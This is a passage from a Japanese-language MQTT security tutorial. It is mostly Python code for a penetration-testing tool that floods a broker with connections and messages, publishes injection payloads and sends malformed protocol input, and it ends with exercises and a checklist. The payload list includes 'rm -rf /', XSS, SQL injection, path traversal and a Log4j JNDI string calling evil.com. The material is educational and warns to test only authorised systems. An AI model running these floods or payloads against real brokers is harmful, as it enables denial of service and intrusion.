                        console.print(f"    📊 接続数: {connection_count}", style="dim")
                    
                except Exception as e:
                    console.print(f"    ❌ 接続{i}で制限: {e}", style="yellow")
                    break
                
                time.sleep(0.1)  # サーバー負荷を軽減
            
            # 大量メッセージ送信テスト
            if clients:
                console.print("  📤 大量メッセージ送信テスト...", style="blue")
                
                message_count = 0
                for client in clients[:10]:  # 最初の10クライアントのみ
                    try:
                        for j in range(10):
                            client.publish("pentest/dos", f"flood_message_{j}")
                            message_count += 1
                    except Exception:
                        break
                
                result['details']['message_flood_count'] = message_count
                console.print(f"    📊 送信メッセージ数: {message_count}", style="dim")
            
            result['details']['max_connections'] = connection_count
            
            if connection_count >= max_connections * 0.8:
                result['vulnerability'] = True
                console.print(f"  ⚠️ 大量接続が可能: {connection_count}接続", style="yellow")
            else:
                console.print(f"  ✅ 接続数制限が有効: {connection_count}接続で制限", style="green")
            
        except Exception as e:
            result['details']['error'] = str(e)
        
        finally:
            # クリーンアップ
            for client in clients:
                try:
                    client.disconnect()
                except:
                    pass
        
        return result
    
    def test_message_injection(self) -> Dict[str, Any]:
        """メッセージインジェクション攻撃テスト"""
        result = {
            'vulnerability': False,
            'details': {},
            'severity': 'MEDIUM'
        }
        
        console.print("  💉 メッセージインジェクションテスト中...", style="blue")
        
        # 悪意のあるペイロード例
        malicious_payloads = [
            '{"command": "rm -rf /", "type": "system"}',
            '<script>alert("XSS")</script>',
            '"; DROP TABLE users; --',
            '../../etc/passwd',
            '${jndi:ldap://evil.com/payload}',  # Log4j系
            '\x00\x01\x02\x03\x04',  # バイナリデータ
            'A' * 1000000,  # 大量データ
        ]
        
        injection_results = []
        
        try:
            client = mqtt.Client("pentest_injection")
            client.connect(self.target_host, self.target_port, 10)
            client.loop_start()
            
            for i, payload in enumerate(malicious_payloads):
                try:
                    topic = f"pentest/injection/{i}"
                    info = client.publish(topic, payload)
                    info.wait_for_publish(timeout=2)
                    
                    injection_results.append({
                        'payload_type': f'injection_{i}',
                        'success': True,
                        'payload_size': len(payload)
                    })
                    
                    console.print(f"    ⚠️ インジェクション成功: タイプ{i}", style="yellow")
                    
                except Exception as e:
                    injection_results.append({
                        'payload_type': f'injection_{i}',
                        'success': False,
                        'error': str(e)
                    })
                    console.print(f"    ✅ インジェクション拒否: タイプ{i}", style="green")
                
                time.sleep(0.5)
            
            client.disconnect()
            client.loop_stop()
            
        except Exception as e:
            result['details']['error'] = str(e)
        
        successful_injections = [r for r in injection_results if r['success']]
        
        if successful_injections:
            result['vulnerability'] = True
            result['details']['successful_injections'] = len(successful_injections)
            console.print(f"  ⚠️ {len(successful_injections)}個のインジェクションが成功", style="yellow")
        else:
            console.print("  ✅ 全てのインジェクション試行がブロックされました", style="green")
        
        result['details']['injection_results'] = injection_results
        
        return result
    
    def test_protocol_anomalies(self) -> Dict[str, Any]:
        """プロトコル異常テスト"""
        result = {
            'vulnerability': False,
            'details': {},
            'severity': 'MEDIUM'
        }
        
        console.print("  🔬 プロトコル異常テスト中...", style="blue")
        
        anomaly_tests = []
        
        # 異常に長いクライアントID
        try:
            long_client_id = 'A' * 65536  # 64KB
            client = mqtt.Client(long_client_id)
            client.connect(self.target_host, self.target_port, 5)
            client.disconnect()
            
            anomaly_tests.append({
                'test': 'long_client_id',
                'result': 'accepted',
                'details': f'Length: {len(long_client_id)}'
            })
            console.print("    ⚠️ 異常に長いクライアントIDが受け入れられました", style="yellow")
            
        except Exception as e:
            anomaly_tests.append({
                'test': 'long_client_id', 
                'result': 'rejected',
                'error': str(e)
            })
            console.print("    ✅ 長いクライアントIDは拒否されました", style="green")
        
        # 異常に長いトピック名
        try:
            client = mqtt.Client("pentest_long_topic")
            client.connect(self.target_host, self.target_port, 5)
            
            long_topic = 'pentest/' + 'A' * 32768  # 32KB
            client.publish(long_topic, "test")
            client.disconnect()
            
            anomaly_tests.append({
                'test': 'long_topic',
                'result': 'accepted',
                'details': f'Length: {len(long_topic)}'
            })
            console.print("    ⚠️ 異常に長いトピック名が受け入れられました", style="yellow")
            
        except Exception as e:
            anomaly_tests.append({
                'test': 'long_topic',
                'result': 'rejected', 
                'error': str(e)
            })
            console.print("    ✅ 長いトピック名は拒否されました", style="green")
        
        # NULL文字を含むトピック
        try:
            client = mqtt.Client("pentest_null_topic")
            client.connect(self.target_host, self.target_port, 5)
            
            null_topic = "pentest\x00null\x00topic"
            client.publish(null_topic, "test")
            client.disconnect()
            
            anomaly_tests.append({
                'test': 'null_in_topic',
                'result': 'accepted'
            })
            console.print("    ⚠️ NULL文字を含むトピックが受け入れられました", style="yellow")
            
        except Exception as e:
            anomaly_tests.append({
                'test': 'null_in_topic',
                'result': 'rejected',
                'error': str(e)
            })
            console.print("    ✅ NULL文字を含むトピックは拒否されました", style="green")
        
        result['details']['anomaly_tests'] = anomaly_tests
        
        # 脆弱性があるテストの数
        vulnerable_tests = [t for t in anomaly_tests if t['result'] == 'accepted']
        if vulnerable_tests:
            result['vulnerability'] = True
            console.print(f"  ⚠️ {len(vulnerable_tests)}個のプロトコル異常が受け入れられました", style="yellow")
        
        return result
    
    def generate_security_report(self):
        """セキュリティレポートの生成"""
        console.print("\n" + "="*60, style="bold blue")
        console.print("📊 MQTT セキュリティペネトレーションテスト結果", style="bold blue")
        console.print("="*60, style="bold blue")
        
        # 脆弱性サマリー
        total_tests = len(self.test_results)
        vulnerable_tests = len(self.vulnerability_found)
        
        summary_table = Table(title="テスト結果サマリー")
        summary_table.add_column("項目", style="cyan", no_wrap=True)
        summary_table.add_column("値", style="magenta")
        
        summary_table.add_row("総テスト数", str(total_tests))
        summary_table.add_row("脆弱性発見数", str(vulnerable_tests))
        summary_table.add_row("セキュリティスコア", f"{((total_tests - vulnerable_tests) / total_tests * 100):.1f}%")
        
        console.print(summary_table)
        
        # 脆弱性詳細
        if self.vulnerability_found:
            console.print(f"\n🚨 発見された脆弱性 ({len(self.vulnerability_found)}件):", style="bold red")
            
            vuln_table = Table()
            vuln_table.add_column("テスト", style="yellow")
            vuln_table.add_column("重要度", style="red")
            vuln_table.add_column("詳細", style="white")
            
            for vuln in self.vulnerability_found:
                severity = vuln['details'].get('severity', 'UNKNOWN')
                details = str(vuln['details'].get('vulnerability', 'N/A'))
                vuln_table.add_row(vuln['test'], severity, details[:50] + "..." if len(details) > 50 else details)
            
            console.print(vuln_table)
            
            # セキュリティ推奨事項
            console.print("\n💡 セキュリティ推奨事項:", style="bold green")
            recommendations = [
                "🔒 強力な認証を実装してください（証明書ベース推奨）",
                "🛡 適切なアクセス制御リスト（ACL）を設定してください", 
                "🔐 TLS/SSL暗号化を有効にしてください",
                "📊 接続数制限とレート制限を実装してください",
                "🔍 セキュリティ監査ログを有効にしてください",
                "⚠️ デフォルトの認証情報を変更してください",
                "🚫 不要なトピックへのアクセスを制限してください",
                "📋 定期的なセキュリティ評価を実施してください"
            ]
            
            for rec in recommendations:
                console.print(f"  {rec}")
        
        else:
            console.print("\n✅ 重大な脆弱性は発見されませんでした！", style="bold green")
            console.print("ただし、継続的なセキュリティ監視を推奨します。")
        
        # 詳細ログの保存
        import json
        report_data = {
            'timestamp': datetime.now().isoformat(),
            'target': f"{self.target_host}:{self.target_port}",
            'test_results': self.test_results,
            'vulnerabilities': self.vulnerability_found,
            'summary': {
                'total_tests': total_tests,
                'vulnerabilities_found': vulnerable_tests,
                'security_score': (total_tests - vulnerable_tests) / total_tests * 100
            }
        }
        
        with open(f"pentest_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json", 'w') as f:
            json.dump(report_data, f, indent=2, ensure_ascii=False)
        
        console.print(f"\n📄 詳細レポートをファイルに保存しました", style="blue")

# 使用例
def main():
    """メイン実行関数"""
    import argparse
    
    parser = argparse.ArgumentParser(description='MQTT セキュリティペネトレーションテスト')
    parser.add_argument('--host', default='localhost', help='対象MQTTブローカーのホスト')
    parser.add_argument('--port', type=int, default=1883, help='対象MQTTブローカーのポート')
    
    args = parser.parse_args()
    
    console.print("""
⚠️  警告: このツールはセキュリティテスト目的でのみ使用してください。
   自身が所有または許可を得たシステムでのみ実行してください。
   不正アクセスは法的問題を引き起こす可能性があります。
    """, style="bold red")
    
    # 確認
    consent = console.input("[bold yellow]続行しますか？ (yes/no): [/bold yellow]")
    if consent.lower() not in ['yes', 'y']:
        console.print("テストを中止しました。", style="yellow")
        return
    
    tester = MQTTPenetrationTester(args.host, args.port)
    tester.run_comprehensive_test()

if __name__ == "__main__":
    main()
```

## 🎯 練習問題

### 問題1: カスタム認証システム
JWTとクライアント証明書を組み合わせたハイブリッド認証システムを実装してください。

### 問題2: セキュリティ監査システム
リアルタイムでセキュリティイベントを検出し、自動対応するシステムを作成してください。

### 問題3: 暗号化メッセージング
MQTTメッセージをエンドツーエンドで暗号化するシステムを実装してください。

## ✅ 確認チェックリスト

- [ ] TLS/SSL暗号化通信を実装できた
- [ ] クライアント証明書認証システムを理解した
- [ ] JWT認証システムを実装できた
- [ ] アクセス制御リスト（ACL）を実装できた
- [ ] セキュリティ監査とロギング機能を作成した
- [ ] ペネトレーションテストツールを理解した
- [ ] セキュリティベストプラクティスを習得した

## 📚 参考資料

- [MQTT Security Guidelines](https://www.hivemq.com/blog/mqtt-security-fundamentals/)
- [TLS 1.3 Best Practices](https://wiki.mozilla.org/Security/Server_Side_TLS)
- [JWT Security Best Practices](https://tools.ietf.org/html/rfc8725)

---

**次のステップ**: [06-error-handling-reconnection](../06-error-handling-reconnection/) でエラーハンドリングと接続回復について学習しましょう！